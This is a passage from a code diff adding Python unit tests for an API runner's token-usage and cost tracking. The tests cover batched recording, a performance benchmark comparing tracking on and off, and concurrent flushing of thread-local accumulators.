+                    "completion_tokens": 5,
+                    "total_tokens": 15,
+                },
+            }
+
+        mock_tracker_instance = MagicMock()
+        mock_tracker_cls = MagicMock(return_value=mock_tracker_instance)
+        with patch.object(_api_runner_module, '_record_token_usage') as mock_record_usage, \
+             patch.object(_api_runner_module, '_CostTracker', mock_tracker_cls), \
+             patch.object(_api_runner_module, '_HAS_TOKEN_BUDGET', True), \
+             patch.object(_api_runner_module, '_HAS_COST_TRACKER', True):
+            res = _api_runner_module._execute_provider_session(
+                "batch-bot", "gpt-4", [{"role": "user", "content": "hi"}],
+                str(hb), str(ckpt), "key",
+                api_call=api_call,
+                drain_check=lambda n: False,
+                tool_dispatch=lambda n, a, **kw: {"success": True, "output": "ok", "error": None},
+                sleep_fn=lambda d: None,
+            )
+            assert res["status"] == "completed"
+            assert mock_record_usage.call_count >= 1
+            total_prompt = sum(
+                c.kwargs["prompt_tokens"] for c in mock_record_usage.call_args_list
+            )
+            total_completion = sum(
+                c.kwargs["completion_tokens"] for c in mock_record_usage.call_args_list
+            )
+            expected_calls = interval + 1
+            assert total_prompt == 10 * expected_calls
+            assert total_completion == 5 * expected_calls
+            assert mock_tracker_instance.record_phase_cost.call_count >= 1
+
+    def test_session_cost_tracking_no_regression_benchmark(self, tmp_path, capsys):
+        """AC4: batched accumulator adds no measurable per-call overhead.
+
+        Times _execute_provider_session with cost recording enabled vs fully
+        disabled; enabled must complete within 5x the disabled wall time and
+        print the measured timings for the pipeline log.
+        """
+        import time as _time
+
+        def make_api_call():
+            def api_call(msgs, model, key):
+                return {
+                    "choices": [{"message": {"content": "done"}}],
+                    "usage": {
+                        "prompt_tokens": 10,
+                        "completion_tokens": 5,
+                        "total_tokens": 15,
+                    },
+                }
+            return api_call
+
+        def run_once(disabled: bool) -> float:
+            hb = tmp_path / f"bench-{disabled}.heartbeat"
+            ckpt = tmp_path / f"CB-BENCH.bench-{disabled}.checkpoint.json"
+            patches = [
+                patch.object(
+                    _api_runner_module, '_HAS_TOKEN_BUDGET', not disabled
+                ),
+                patch.object(
+                    _api_runner_module, '_HAS_COST_TRACKER', not disabled
+                ),
+            ]
+            if disabled:
+                patches.append(
+                    patch.object(_api_runner_module, '_record_token_usage', None)
+                )
+                patches.append(
+                    patch.object(_api_runner_module, '_CostTracker', None)
+                )
+            else:
+                patches.append(
+                    patch.object(
+                        _api_runner_module, '_record_token_usage',
+                        MagicMock(side_effect=lambda **kw: None),
+                    )
+                )
+                mock_tracker = MagicMock()
+                patches.append(
+                    patch.object(
+                        _api_runner_module, '_CostTracker',
+                        MagicMock(return_value=mock_tracker),
+                    )
+                )
+            for p in patches:
+                p.start()
+            try:
+                start = _time.perf_counter()
+                res = _api_runner_module._execute_provider_session(
+                    "bench-bot", "gpt-4", [{"role": "user", "content": "hi"}],
+                    str(hb), str(ckpt), "key",
+                    api_call=make_api_call(),
+                    drain_check=lambda n: False,
+                    sleep_fn=lambda d: None,
+                )
+                elapsed = _time.perf_counter() - start
+                assert res["status"] == "completed"
+                return elapsed
+            finally:
+                for p in reversed(patches):
+                    p.stop()
+
+        # Warm up once so import/lazy-init noise doesn't skew the comparison.
+        run_once(True)
+        disabled_t = min(run_once(True) for _ in range(3))
+        enabled_t = min(run_once(False) for _ in range(3))
+        with capsys.disabled():
+            print(
+                f"\n[cost-tracking-benchmark] disabled={disabled_t:.4f}s "
+                f"enabled={enabled_t:.4f}s ratio={enabled_t/max(disabled_t, 1e-9):.2f}x"
+            )
+        assert enabled_t <= max(5 * disabled_t, disabled_t + 1.0), (
+            f"cost tracking regressed session loop: disabled={disabled_t:.4f}s "
+            f"enabled={enabled_t:.4f}s"
+        )
+
+    def test_atomic_recording_under_concurrent_access(self):
+        """Concurrent _flush_cost_accumulator calls complete without exception.
+
+        Patches are applied ONCE outside worker threads to avoid race conditions
+        on module-level globals. The test verifies that the thread-local
+        accumulator drain logic is safe under concurrent invocation.
+        """
+        import threading
+
+        errors = []
+        completed = []
+
+        # Use thread-safe mocks patched once for all threads
+        mock_record = MagicMock()
+        mock_tracker_instance = MagicMock()
+        mock_tracker_cls = MagicMock(return_value=mock_tracker_instance)
+
+        def worker(thread_id):
+            try:
+                # Each thread seeds its own thread-local accumulator
+                _init_cost_accumulator()
+                _cost_accumulator.prompt_tokens = 10 * thread_id
+                _cost_accumulator.completion_tokens = 5 * thread_id
+                _cost_accumulator.call_count = thread_id
+                _cost_accumulator.start_time = time.time()
+
+                _flush_cost_accumulator(f"bot-{thread_id}", f"CB-{thread_id}", "gpt-4", "implement")
+
+                completed.append(thread_id)
+            except Exception as e:
+                errors.append((thread_id, str(e)))
+
+        with patch.object(_api_runner_module, '_record_token_usage', mock_record), \
+             patch.object(_api_runner_module, '_CostTracker', mock_tracker_cls), \
+             patch.object(_api_runner_module, '_HAS_TOKEN_BUDGET', True), \
+             patch.object(_api_runner_module, '_HAS_COST_TRACKER', True):
+            threads = [threading.Thread(target=worker, args=(i,)) for i in range(1, 5)]
+            for t in threads:
+                t.start()
+            for t in threads:
+                t.join(timeout=10)
+
+        # All threads must complete without exception
+        assert len(errors) == 0, f"Concurrent flush failed: {errors}"
+        assert len(completed) == 4, f"Expected 4 completions, got {len(completed)}"
